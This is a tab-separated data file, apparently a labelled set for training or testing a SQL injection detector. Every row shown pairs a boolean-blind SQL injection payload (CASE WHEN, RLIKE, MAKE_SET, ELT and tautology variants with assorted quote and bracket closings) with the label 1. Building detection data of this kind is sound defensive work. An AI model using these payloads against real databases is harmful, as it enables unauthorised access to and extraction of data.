Query	Label
-9919' OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-3890" OR 6878=(SELECT (CASE WHEN (6878=9552) THEN 6878 ELSE (SELECT 9552 UNION SELECT 1431) END))	1
-4738" OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-8265)) OR 8543=(SELECT (CASE WHEN (8543=5490) THEN 8543 ELSE (SELECT 5490 UNION SELECT 6131) END))	1
-3111)) OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-1424))) OR 5503=(SELECT (CASE WHEN (5503=3536) THEN 5503 ELSE (SELECT 3536 UNION SELECT 6266) END))	1
-4179))) OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-1672 OR 6627=(SELECT (CASE WHEN (6627=3871) THEN 6627 ELSE (SELECT 3871 UNION SELECT 8653) END))	1
-6251 OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-3524')) OR 9085=(SELECT (CASE WHEN (9085=5417) THEN 9085 ELSE (SELECT 5417 UNION SELECT 9491) END))	1
-6193')) OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-7569'))) OR 1957=(SELECT (CASE WHEN (1957=1281) THEN 1957 ELSE (SELECT 1281 UNION SELECT 8740) END))	1
-6206'))) OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-8860%' OR 9221=(SELECT (CASE WHEN (9221=8906) THEN 9221 ELSE (SELECT 8906 UNION SELECT 7726) END))	1
-5802%' OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-6692") OR 3057=(SELECT (CASE WHEN (3057=7640) THEN 3057 ELSE (SELECT 7640 UNION SELECT 5193) END))	1
-7505") OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-8071")) OR 9012=(SELECT (CASE WHEN (9012=2029) THEN 9012 ELSE (SELECT 2029 UNION SELECT 8658) END))	1
-6596")) OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-9685"))) OR 1874=(SELECT (CASE WHEN (1874=9691) THEN 1874 ELSE (SELECT 9691 UNION SELECT 2025) END))	1
-8797"))) OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-9859') WHERE 6618=6618 OR 8977=(SELECT (CASE WHEN (8977=3170) THEN 8977 ELSE (SELECT 3170 UNION SELECT 1199) END))	1
-8228') WHERE 9900=9900 OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-4560") WHERE 7263=7263 OR 3247=(SELECT (CASE WHEN (3247=4084) THEN 3247 ELSE (SELECT 4084 UNION SELECT 2804) END))	1
-9135") WHERE 4493=4493 OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-8002) WHERE 6881=6881 OR 9477=(SELECT (CASE WHEN (9477=1163) THEN 9477 ELSE (SELECT 1163 UNION SELECT 4153) END))	1
-6295) WHERE 5714=5714 OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-5024' WHERE 6413=6413 OR 8526=(SELECT (CASE WHEN (8526=9122) THEN 8526 ELSE (SELECT 9122 UNION SELECT 9513) END))	1
-7863' WHERE 6160=6160 OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-6663" WHERE 1569=1569 OR 8337=(SELECT (CASE WHEN (8337=3253) THEN 8337 ELSE (SELECT 3253 UNION SELECT 7702) END))	1
-1165" WHERE 3285=3285 OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-1897 WHERE 2818=2818 OR 8949=(SELECT (CASE WHEN (8949=6262) THEN 8949 ELSE (SELECT 6262 UNION SELECT 3924) END))	1
-2364 WHERE 7909=7909 OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-4682')) AS zrvU WHERE 4942=4942 OR 1031=(SELECT (CASE WHEN (1031=1306) THEN 1031 ELSE (SELECT 1306 UNION SELECT 1290) END))	1
-2760')) AS YygJ WHERE 1879=1879 OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-7786")) AS ByuE WHERE 8114=8114 OR 6164=(SELECT (CASE WHEN (6164=3318) THEN 6164 ELSE (SELECT 3318 UNION SELECT 2310) END))	1
-8196")) AS JcCn WHERE 6275=6275 OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-5395)) AS HyJI WHERE 3301=3301 OR 1839=(SELECT (CASE WHEN (1839=3463) THEN 1839 ELSE (SELECT 3463 UNION SELECT 5300) END))	1
-4271)) AS PikW WHERE 4943=4943 OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-8985') AS ThPf WHERE 6704=6704 OR 9783=(SELECT (CASE WHEN (9783=3741) THEN 9783 ELSE (SELECT 3741 UNION SELECT 2869) END))	1
-3769') AS twCU WHERE 8617=8617 OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-3206") AS OlxK WHERE 5854=5854 OR 8320=(SELECT (CASE WHEN (8320=8496) THEN 8320 ELSE (SELECT 8496 UNION SELECT 4731) END))	1
-5506") AS ZkPU WHERE 5143=5143 OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
-5551) AS efDe WHERE 8191=8191 OR 5271=(SELECT (CASE WHEN (5271=4884) THEN 5271 ELSE (SELECT 4884 UNION SELECT 6977) END))	1
-2871) AS izuM WHERE 5573=5573 OR 8507=(SELECT (CASE WHEN (8507=8507) THEN 8507 ELSE (SELECT 7670 UNION SELECT 2882) END))	1
3))) AND 7029=8882	1
3)))) AND 1803=4694	1
3)')) AND 6144=6673	1
3)'))) AND 3430=7806	1
3)%' AND 6713=8333	1
3)") AND 8929=9097	1
3)")) AND 4052=6267	1
3)"))) AND 5202=3084	1
3)' IN BOOLEAN MODE) AND 2122=9034	1
-1907)) OR 8856=2132	1
-6252)) OR 5106=5106	1
-5584))) OR 8438=3439	1
-8700))) OR 5106=5106	1
-5516')) OR 2666=1150	1
-6979')) OR 5106=5106	1
-7813'))) OR 6489=8654	1
-4244'))) OR 5106=5106	1
-4028%' OR 4160=3780	1
-8647%' OR 5106=5106	1
-3223") OR 2918=5560	1
-6777") OR 5106=5106	1
-8103")) OR 6144=2798	1
-6506")) OR 5106=5106	1
-3366"))) OR 5929=5710	1
-3743"))) OR 5106=5106	1
3))) OR NOT 6907=7077	1
3)))) OR NOT 6689=5502	1
3)')) OR NOT 9558=6714	1
3)'))) OR NOT 4083=3430	1
3)%' OR NOT 3866=5497	1
3)") OR NOT 7115=9883	1
3)")) OR NOT 8961=7426	1
3)"))) OR NOT 5516=2016	1
3)' IN BOOLEAN MODE) OR NOT 2269=8921	1
3)) AND 2223=9640#	1
3)') AND 5697=3177#	1
3)' AND 5427=1605#	1
3)" AND 7863=3583#	1
3))) AND 3459=3885#	1
3)))) AND 2388=9092#	1
3) AND 6350=6763#	1
3)')) AND 3480=2776#	1
3)'))) AND 4835=6781#	1
3)%' AND 1244=6771#	1
3)") AND 9742=6779#	1
3)")) AND 3097=2521#	1
3)"))) AND 1756=2939#	1
3)')) AS NfYy WHERE 9587=9587 AND 8878=7759#	1
3)")) AS UAUd WHERE 1379=1379 AND 4022=5451#	1
3))) AS Xdho WHERE 9741=9741 AND 1293=8011#	1
3)') AS OOES WHERE 7361=7361 AND 4429=6855#	1
3)") AS bVXn WHERE 9766=9766 AND 3308=6036#	1
3)) AS qkRE WHERE 9072=9072 AND 3227=7095#	1
3)` WHERE 4320=4320 AND 2319=6417#	1
3)`) WHERE 9407=9407 AND 9952=5185#	1
-1531) OR 4029=5661#	1
-5259) OR 4059=4059#	1
-7094') OR 4378=5934#	1
-9724') OR 4059=4059#	1
-4782' OR 3960=4143#	1
-4569' OR 4059=4059#	1
-3739" OR 2479=6531#	1
-6574" OR 4059=4059#	1
-5066)) OR 8586=8606#	1
-1752)) OR 4059=4059#	1
-3120))) OR 5121=6812#	1
-4870))) OR 4059=4059#	1
-9581 OR 7375=1291#	1
-7310 OR 4059=4059#	1
-5381')) OR 8738=9101#	1
-4202')) OR 4059=4059#	1
-5025'))) OR 9107=9846#	1
-5675'))) OR 4059=4059#	1
-5320%' OR 8771=5327#	1
-9896%' OR 4059=4059#	1
-9528") OR 1695=9971#	1
-1358") OR 4059=4059#	1
-1474")) OR 9719=1992#	1
-4714")) OR 4059=4059#	1
-3472"))) OR 3696=6787#	1
-6676"))) OR 4059=4059#	1
-4667')) AS WsNN WHERE 8095=8095 OR 9344=4483#	1
-8449')) AS ijkg WHERE 3545=3545 OR 4059=4059#	1
-9797")) AS WObS WHERE 5322=5322 OR 8914=5705#	1
-3343")) AS Qslb WHERE 1575=1575 OR 4059=4059#	1
-8965)) AS oGeS WHERE 3493=3493 OR 6805=9734#	1
-5572)) AS ouqZ WHERE 9183=9183 OR 4059=4059#	1
-2576') AS GQXL WHERE 7485=7485 OR 9557=5953#	1
-7323') AS xhdG WHERE 7619=7619 OR 4059=4059#	1
-2642") AS SOpX WHERE 6736=6736 OR 5123=1247#	1
-4458") AS sKVG WHERE 9376=9376 OR 4059=4059#	1
-9728) AS zRUt WHERE 5357=5357 OR 8810=6316#	1
-6372) AS ANcN WHERE 3527=3527 OR 4059=4059#	1
3)) OR NOT 5645=4093#	1
3)') OR NOT 6576=6266#	1
3)' OR NOT 4096=6032#	1
3)" OR NOT 4669=2965#	1
3))) OR NOT 4185=3879#	1
3)))) OR NOT 6894=3089#	1
3) OR NOT 8351=4182#	1
3)')) OR NOT 7238=6893#	1
3)'))) OR NOT 5720=9075#	1
3)%' OR NOT 6284=6941#	1
3)") OR NOT 6048=1894#	1
3)")) OR NOT 1947=1372#	1
3)"))) OR NOT 1447=7402#	1
3)')) AS WKYA WHERE 9675=9675 OR NOT 5240=6860#	1
3)")) AS uuBu WHERE 4387=4387 OR NOT 5494=6506#	1
3))) AS lacH WHERE 7808=7808 OR NOT 4051=1085#	1
3)') AS ARHf WHERE 7325=7325 OR NOT 5576=6483#	1
3)") AS AVyF WHERE 4984=4984 OR NOT 4625=6119#	1
3)) AS zXeq WHERE 3068=3068 OR NOT 6518=5320#	1
3)` WHERE 4578=4578 OR NOT 3897=1508#	1
3)`) WHERE 6008=6008 OR NOT 8638=1978#	1
3)) AND 2424=5144	1
3)') AND 3384=1310	1
3)' AND 6108=3057	1
3)" AND 1678=6352	1
3))) AND 8169=1045	1
3)))) AND 3192=4950	1
3) AND 3446=6970	1
3)')) AND 4939=9441	1
3)'))) AND 7282=5589	1
3)%' AND 6603=4770	1
3)") AND 8798=3116	1
3)")) AND 4938=5370	1
3)"))) AND 9093=2323	1
3)')) AS oeZr WHERE 2614=2614 AND 9330=5282	1
3)")) AS lhtG WHERE 5524=5524 AND 3897=8589	1
3))) AS HDMx WHERE 7165=7165 AND 8736=1318	1
3)') AS gEzp WHERE 6872=6872 AND 5863=2225	1
3)") AS AuFV WHERE 8163=8163 AND 8124=8615	1
3)) AS rlWv WHERE 4457=4457 AND 1789=4045	1
3)` WHERE 8077=8077 AND 7197=1087	1
3)`) WHERE 7898=7898 AND 2300=8755	1
3)' IN BOOLEAN MODE) AND 9684=7103	1
-9182) OR 5746=7913	1
-6627) OR 2010=2010	1
-7594') OR 1162=9718	1
-8637') OR 2010=2010	1
-7910' OR 4078=6691	1
-4314' OR 2010=2010	1
-4130" OR 8212=8377	1
-3673" OR 2010=2010	1
-6549)) OR 8115=3928	1
-6367)) OR 2010=2010	1
-5371))) OR 4521=2690	1
-9802))) OR 2010=2010	1
-1949 OR 5686=9229	1
-1585 OR 2010=2010	1
-5641')) OR 9631=7865	1
-5507')) OR 2010=2010	1
-3514'))) OR 7524=1078	1
-7684'))) OR 2010=2010	1
-3130%' OR 3860=6227	1
-3702%' OR 2010=2010	1
-1772") OR 6182=7455	1
-1382") OR 2010=2010	1
-6509")) OR 2150=4485	1
-6461")) OR 2010=2010	1
-8180"))) OR 9405=6356	1
-2124"))) OR 2010=2010	1
-3750')) AS MYRK WHERE 9435=9435 OR 1675=1129	1
-8810')) AS oqgA WHERE 3842=3842 OR 2010=2010	1
-5607")) AS KMeN WHERE 2028=2028 OR 2893=3249	1
-4894")) AS sbGW WHERE 1467=1467 OR 2010=2010	1
-5671)) AS MEtw WHERE 7294=7294 OR 7758=8710	1
-8266)) AS OiVm WHERE 7077=7077 OR 2010=2010	1
-1600') AS tAmr WHERE 6993=6993 OR 7400=4813	1
-8531') AS cIXt WHERE 9860=9860 OR 2010=2010	1
-4179") AS ZqxB WHERE 7114=7114 OR 5987=1956	1
-6682") AS UVpS WHERE 6765=6765 OR 2010=2010	1
-6091) AS sSem WHERE 4781=4781 OR 2413=1950	1
-6804) AS jyTW WHERE 3302=3302 OR 2010=2010	1
3)) RLIKE (SELECT (CASE WHEN (6342=5015) THEN 0x3329 ELSE 0x28 END))	1
3)') RLIKE (SELECT (CASE WHEN (9813=9818) THEN 0x3329 ELSE 0x28 END))	1
3)' RLIKE (SELECT (CASE WHEN (6680=6369) THEN 0x3329 ELSE 0x28 END))	1
3)" RLIKE (SELECT (CASE WHEN (7526=2973) THEN 0x3329 ELSE 0x28 END))	1
3)) RLIKE (SELECT (CASE WHEN (3336=8573) THEN 0x3329 ELSE 0x28 END)) AND (3848=3848	1
3))) RLIKE (SELECT (CASE WHEN (4593=1822) THEN 0x3329 ELSE 0x28 END)) AND ((6986=6986	1
3)))) RLIKE (SELECT (CASE WHEN (9123=7099) THEN 0x3329 ELSE 0x28 END)) AND (((1357=1357	1
3) RLIKE (SELECT (CASE WHEN (2099=6462) THEN 0x3329 ELSE 0x28 END))	1
3)') RLIKE (SELECT (CASE WHEN (7145=4514) THEN 0x3329 ELSE 0x28 END)) AND ('uXai'='uXai	1
3)')) RLIKE (SELECT (CASE WHEN (5712=6489) THEN 0x3329 ELSE 0x28 END)) AND (('esei'='esei	1
3)'))) RLIKE (SELECT (CASE WHEN (3702=3634) THEN 0x3329 ELSE 0x28 END)) AND ((('irHC'='irHC	1
3)' RLIKE (SELECT (CASE WHEN (5265=5254) THEN 0x3329 ELSE 0x28 END)) AND 'pjLg'='pjLg	1
3)') RLIKE (SELECT (CASE WHEN (3890=5744) THEN 0x3329 ELSE 0x28 END)) AND ('HfXt' LIKE 'HfXt	1
3)')) RLIKE (SELECT (CASE WHEN (2818=3336) THEN 0x3329 ELSE 0x28 END)) AND (('bfXt' LIKE 'bfXt	1
3)'))) RLIKE (SELECT (CASE WHEN (7428=6831) THEN 0x3329 ELSE 0x28 END)) AND ((('IeIf' LIKE 'IeIf	1
3)%' RLIKE (SELECT (CASE WHEN (7930=3344) THEN 0x3329 ELSE 0x28 END)) AND 'RxXC%'='RxXC	1
3)' RLIKE (SELECT (CASE WHEN (4417=7669) THEN 0x3329 ELSE 0x28 END)) AND 'mcJL' LIKE 'mcJL	1
3)") RLIKE (SELECT (CASE WHEN (6242=2916) THEN 0x3329 ELSE 0x28 END)) AND ("qKTG"="qKTG	1
3)")) RLIKE (SELECT (CASE WHEN (6174=8096) THEN 0x3329 ELSE 0x28 END)) AND (("bZyk"="bZyk	1
3)"))) RLIKE (SELECT (CASE WHEN (9306=6751) THEN 0x3329 ELSE 0x28 END)) AND ((("agpw"="agpw	1
3)" RLIKE (SELECT (CASE WHEN (2525=1977) THEN 0x3329 ELSE 0x28 END)) AND "RSjI"="RSjI	1
3)") RLIKE (SELECT (CASE WHEN (8709=4761) THEN 0x3329 ELSE 0x28 END)) AND ("aVBg" LIKE "aVBg	1
3)")) RLIKE (SELECT (CASE WHEN (5719=3737) THEN 0x3329 ELSE 0x28 END)) AND (("gSaj" LIKE "gSaj	1
3)"))) RLIKE (SELECT (CASE WHEN (3062=3481) THEN 0x3329 ELSE 0x28 END)) AND ((("OCxd" LIKE "OCxd	1
3)" RLIKE (SELECT (CASE WHEN (5298=1784) THEN 0x3329 ELSE 0x28 END)) AND "SbMt" LIKE "SbMt	1
3) RLIKE (SELECT (CASE WHEN (7558=3806) THEN 0x3329 ELSE 0x28 END))	1
3) RLIKE (SELECT (CASE WHEN (9406=3980) THEN 0x3329 ELSE 0x28 END))# zSfZ	1
3)' RLIKE (SELECT (CASE WHEN (3338=6424) THEN 0x3329 ELSE 0x28 END)) OR 'kTDF'='FoxZ	1
3)')) AS SgiH WHERE 9627=9627 RLIKE (SELECT (CASE WHEN (3688=1896) THEN 0x3329 ELSE 0x28 END))	1
3)")) AS Plpg WHERE 9053=9053 RLIKE (SELECT (CASE WHEN (3353=6958) THEN 0x3329 ELSE 0x28 END))	1
3))) AS AtBv WHERE 7986=7986 RLIKE (SELECT (CASE WHEN (3644=5484) THEN 0x3329 ELSE 0x28 END))	1
3)') AS VtGE WHERE 4160=4160 RLIKE (SELECT (CASE WHEN (7436=1951) THEN 0x3329 ELSE 0x28 END))	1
3)") AS QNgp WHERE 6825=6825 RLIKE (SELECT (CASE WHEN (8222=6581) THEN 0x3329 ELSE 0x28 END))	1
3)) AS bvkM WHERE 8840=8840 RLIKE (SELECT (CASE WHEN (1223=6083) THEN 0x3329 ELSE 0x28 END))	1
3)` WHERE 9260=9260 RLIKE (SELECT (CASE WHEN (9933=5594) THEN 0x3329 ELSE 0x28 END))	1
3)`) WHERE 7060=7060 RLIKE (SELECT (CASE WHEN (7587=6562) THEN 0x3329 ELSE 0x28 END))	1
3)' IN BOOLEAN MODE) RLIKE (SELECT (CASE WHEN (6840=7203) THEN 0x3329 ELSE 0x28 END))#	1
3)) AND MAKE_SET(3063=5430,5430)	1
3)') AND MAKE_SET(7602=4570,4570)	1
3)' AND MAKE_SET(2288=6038,6038)	1
3)" AND MAKE_SET(5754=8055,8055)	1
3)) AND MAKE_SET(5685=9533,9533) AND (6323=6323	1
3))) AND MAKE_SET(8559=1435,1435) AND ((7151=7151	1
3)))) AND MAKE_SET(5323=6840,6840) AND (((3836=3836	1
3) AND MAKE_SET(9629=9712,9712)	1
3)') AND MAKE_SET(8847=1237,1237) AND ('CZGD'='CZGD	1
3)')) AND MAKE_SET(3568=5631,5631) AND (('Nnye'='Nnye	1
3)'))) AND MAKE_SET(2253=1619,1619) AND ((('zQtB'='zQtB	1
3)' AND MAKE_SET(1060=2626,2626) AND 'gkhF'='gkhF	1
3)') AND MAKE_SET(6142=6311,6311) AND ('KhhU' LIKE 'KhhU	1
3)')) AND MAKE_SET(3865=8010,8010) AND (('SgQf' LIKE 'SgQf	1
3)'))) AND MAKE_SET(4806=1962,1962) AND ((('SZIg' LIKE 'SZIg	1
3)%' AND MAKE_SET(8894=5782,5782) AND 'QZAl%'='QZAl	1
3)' AND MAKE_SET(9289=9810,9810) AND 'jxoY' LIKE 'jxoY	1
3)") AND MAKE_SET(7053=1494,1494) AND ("WsAS"="WsAS	1
3)")) AND MAKE_SET(9535=4868,4868) AND (("UYWC"="UYWC	1
3)"))) AND MAKE_SET(3371=8882,8882) AND ((("rFVw"="rFVw	1
3)" AND MAKE_SET(7909=8194,8194) AND "TQyG"="TQyG	1
3)") AND MAKE_SET(5251=4578,4578) AND ("gcBl" LIKE "gcBl	1
3)")) AND MAKE_SET(1700=9353,9353) AND (("Aoxj" LIKE "Aoxj	1
3)"))) AND MAKE_SET(5238=6739,6739) AND ((("LUXB" LIKE "LUXB	1
3)" AND MAKE_SET(8452=9222,9222) AND "IiGg" LIKE "IiGg	1
3) AND MAKE_SET(9284=2381,2381)	1
3) AND MAKE_SET(9510=4182,4182)# Qikw	1
3)' AND MAKE_SET(5076=7425,7425) OR 'tJco'='gjCt	1
3)')) AS Jpfr WHERE 9175=9175 AND MAKE_SET(8079=8622,8622)	1
3)")) AS uSAO WHERE 8669=8669 AND MAKE_SET(8061=8579,8579)	1
3))) AS yKFR WHERE 7670=7670 AND MAKE_SET(4708=4058,4058)	1
3)') AS QKPs WHERE 6287=6287 AND MAKE_SET(1699=1404,1404)	1
3)") AS kAUs WHERE 9740=9740 AND MAKE_SET(1797=2134,2134)	1
3)) AS WGAa WHERE 9259=9259 AND MAKE_SET(8752=9351,9351)	1
3)` WHERE 1372=1372 AND MAKE_SET(4743=5536,5536)	1
3)`) WHERE 7436=7436 AND MAKE_SET(5660=8198,8198)	1
3)`=`3)` AND MAKE_SET(4861=9177,9177) AND `3)`=`3)	1
3)"="3)" AND MAKE_SET(4938=2323,2323) AND "3)"="3)	1
3)]-(SELECT 0 WHERE 3239=3239 AND MAKE_SET(6881=2624,2624))|[3)	1
3)' IN BOOLEAN MODE) AND MAKE_SET(2120=6647,6647)#	1
-4973) OR MAKE_SET(9059=7686,7686)	1
-3837) OR MAKE_SET(4513=4513,9040)	1
-8218') OR MAKE_SET(9991=9127,9127)	1
-8702') OR MAKE_SET(4513=4513,9040)	1
-5029' OR MAKE_SET(7488=2230,2230)	1
-6740' OR MAKE_SET(4513=4513,9040)	1
-8580" OR MAKE_SET(4879=9393,9393)	1
-3802" OR MAKE_SET(4513=4513,9040)	1
-9853) OR MAKE_SET(4967=3231,3231) AND (3551=3551	1
-7479) OR MAKE_SET(4513=4513,9040) AND (3770=3770	1
-1578)) OR MAKE_SET(1358=1931,1931) AND ((1405=1405	1
-9179)) OR MAKE_SET(4513=4513,9040) AND ((2086=2086	1
-5946))) OR MAKE_SET(3054=6597,6597) AND (((5168=5168	1
-9476))) OR MAKE_SET(4513=4513,9040) AND (((6968=6968	1
-2741 OR MAKE_SET(8969=8432,8432)	1
-4284 OR MAKE_SET(4513=4513,9040)	1
-1144') OR MAKE_SET(4987=9714,9714) AND ('EyWT'='EyWT	1
-7075') OR MAKE_SET(4513=4513,9040) AND ('YYyE'='YYyE	1
-5402')) OR MAKE_SET(5813=7032,7032) AND (('ZIqF'='ZIqF	1
-6506')) OR MAKE_SET(4513=4513,9040) AND (('npdf'='npdf	1
-6922'))) OR MAKE_SET(5022=1169,1169) AND ((('mldB'='mldB	1
-1946'))) OR MAKE_SET(4513=4513,9040) AND ((('jRYl'='jRYl	1
-3131' OR MAKE_SET(3360=9100,9100) AND 'ViTf'='ViTf	1
-1856' OR MAKE_SET(4513=4513,9040) AND 'VPXE'='VPXE	1
-5420') OR MAKE_SET(1544=5238,5238) AND ('blke' LIKE 'blke	1
-1343') OR MAKE_SET(4513=4513,9040) AND ('bZEa' LIKE 'bZEa	1
-3714')) OR MAKE_SET(6755=2899,2899) AND (('GNCB' LIKE 'GNCB	1
-4673')) OR MAKE_SET(4513=4513,9040) AND (('PeaS' LIKE 'PeaS	1
-8862'))) OR MAKE_SET(5273=4544,4544) AND ((('Olnd' LIKE 'Olnd	1
-8934'))) OR MAKE_SET(4513=4513,9040) AND ((('KyLn' LIKE 'KyLn	1
-6267%' OR MAKE_SET(8695=6624,6624) AND 'ODss%'='ODss	1
-2955%' OR MAKE_SET(4513=4513,9040) AND 'WamW%'='WamW	1
-9444' OR MAKE_SET(1066=6050,6050) AND 'uYjt' LIKE 'uYjt	1
-4384' OR MAKE_SET(4513=4513,9040) AND 'Rdok' LIKE 'Rdok	1
-3014") OR MAKE_SET(2921=4399,4399) AND ("WttG"="WttG	1
-8387") OR MAKE_SET(4513=4513,9040) AND ("PyaG"="PyaG	1
-7372")) OR MAKE_SET(4310=3770,3770) AND (("QLRn"="QLRn	1
-2171")) OR MAKE_SET(4513=4513,9040) AND (("QoFk"="QoFk	1
-4095"))) OR MAKE_SET(8676=1067,1067) AND ((("jzcB"="jzcB	1
-1604"))) OR MAKE_SET(4513=4513,9040) AND ((("bGwQ"="bGwQ	1
-1117" OR MAKE_SET(5270=4317,4317) AND "BvTz"="BvTz	1
-3777" OR MAKE_SET(4513=4513,9040) AND "xrSu"="xrSu	1
-1109") OR MAKE_SET(1795=3993,3993) AND ("eryM" LIKE "eryM	1
-6273") OR MAKE_SET(4513=4513,9040) AND ("vNmi" LIKE "vNmi	1
-8072")) OR MAKE_SET(2855=1896,1896) AND (("TkxQ" LIKE "TkxQ	1
-5496")) OR MAKE_SET(4513=4513,9040) AND (("QcRp" LIKE "QcRp	1
-2122"))) OR MAKE_SET(2347=2192,2192) AND ((("hXOT" LIKE "hXOT	1
-1854"))) OR MAKE_SET(4513=4513,9040) AND ((("CVlD" LIKE "CVlD	1
-7093" OR MAKE_SET(4273=2333,2333) AND "tTnQ" LIKE "tTnQ	1
-4008" OR MAKE_SET(4513=4513,9040) AND "aYiR" LIKE "aYiR	1
-1990 OR MAKE_SET(2639=4353,4353)	1
-3957 OR MAKE_SET(4513=4513,9040)	1
-6011 OR MAKE_SET(6571=6378,6378)# CsMW	1
-3710 OR MAKE_SET(4513=4513,9040)# YELm	1
-9646' OR MAKE_SET(2352=7153,7153) OR 'IknX'='nEsv	1
-9178' OR MAKE_SET(4513=4513,9040) OR 'clba'='GsHK	1
-8309')) AS gLuY WHERE 4050=4050 OR MAKE_SET(1695=9891,9891)	1
-1009')) AS FowE WHERE 4690=4690 OR MAKE_SET(4513=4513,9040)	1
-8263")) AS osjd WHERE 3081=3081 OR MAKE_SET(9903=6865,6865)	1
-3399")) AS XDAt WHERE 9962=9962 OR MAKE_SET(4513=4513,9040)	1
-8236)) AS zmdJ WHERE 4499=4499 OR MAKE_SET(6359=2494,2494)	1
-2267)) AS nxrS WHERE 1547=1547 OR MAKE_SET(4513=4513,9040)	1
-6784') AS UwZu WHERE 4967=4967 OR MAKE_SET(9432=4801,4801)	1
-1700') AS tLDo WHERE 9596=9596 OR MAKE_SET(4513=4513,9040)	1
-1150") AS jiHT WHERE 9065=9065 OR MAKE_SET(2991=4660,4660)	1
-8335") AS djYb WHERE 6759=6759 OR MAKE_SET(4513=4513,9040)	1
-9468) AS pnEW WHERE 5319=5319 OR MAKE_SET(1771=6619,6619)	1
-5282) AS cYLV WHERE 4224=4224 OR MAKE_SET(4513=4513,9040)	1
3)) AND ELT(2912=1667,1667)	1
3)') AND ELT(6999=6592,6592)	1
3)' AND ELT(9481=1516,1516)	1
3)" AND ELT(2556=9340,9340)	1
3)) AND ELT(9020=1822,1822) AND (3037=3037	1
3))) AND ELT(6407=8303,8303) AND ((3398=3398	1
3)))) AND ELT(2018=8231,8231) AND (((4476=4476	1
3) AND ELT(1115=1797,1797)	1
3)') AND ELT(1218=9633,9633) AND ('UTWM'='UTWM	1
3)')) AND ELT(4648=8853,8853) AND (('lvBa'='lvBa	1
3)'))) AND ELT(6923=9825,9825) AND ((('qVRa'='qVRa	1
3)' AND ELT(8852=5075,5075) AND 'mdVd'='mdVd	1
3)') AND ELT(5803=6397,6397) AND ('FHbi' LIKE 'FHbi	1
3)')) AND ELT(9450=6697,6697) AND (('ixMh' LIKE 'ixMh	1
3)'))) AND ELT(3623=1041,1041) AND ((('GwMt' LIKE 'GwMt	1
3)%' AND ELT(9529=1746,1746) AND 'GRlu%'='GRlu	1
